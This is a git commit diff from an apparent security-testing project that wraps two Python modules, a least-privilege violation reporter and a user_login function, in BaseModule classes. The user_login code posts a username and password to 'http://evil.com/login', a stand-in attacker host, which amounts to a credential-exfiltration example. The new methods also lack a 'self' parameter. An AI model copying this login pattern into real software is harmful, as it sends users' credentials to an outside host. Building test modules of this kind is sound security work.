c7a8e6623e29bade087e1717050a564db0a3cf94
Redhoxx <red.h0x50@gmail.com>
2024-12-09 23:59:07 +0100

    Upgrade to BaseModule class

--- vulnerabilities/modules/report_violation_least_priv.py
+++ vulnerabilities/modules/report_violation_least_priv.py
@@ -1,7 +1,8 @@
 from base_module import BaseModule
 
-def report_violation(violation_type, username, resource_url):
-  print(f"Violation du principe du moindre privilège détectée !")
-  print(f"  Type de violation: {violation_type}")
-  print(f"  Utilisateur: {username}")
-  print(f"  Ressource: {resource_url}")
+class Module(BaseModule):
+  def report_violation(violation_type, username, resource_url):
+    print(f"Violation du principe du moindre privilège détectée !")
+    print(f"  Type de violation: {violation_type}")
+    print(f"  Utilisateur: {username}")
+    print(f"  Ressource: {resource_url}")
--- vulnerabilities/modules/user_login.py
+++ vulnerabilities/modules/user_login.py
@@ -1,15 +1,16 @@
 from base_module import BaseModule
 import requests
 
-def user_login(username, password):
-  session = requests.Session()
-  login_url = "http://evil.com/login"
-  data = {
-      "username": username,
-      "password": password,
-  }
-  response = session.post(login_url, data=data)
-  if response.status_code == 200:
-    return session
-  else:
-    return None
+class Module(BaseModule):
+  def user_login(username, password):
+    session = requests.Session()
+    login_url = "http://evil.com/login"
+    data = {
+        "username": username,
+        "password": password,
+    }
+    response = session.post(login_url, data=data)
+    if response.status_code == 200:
+      return session
+    else:
+      return None
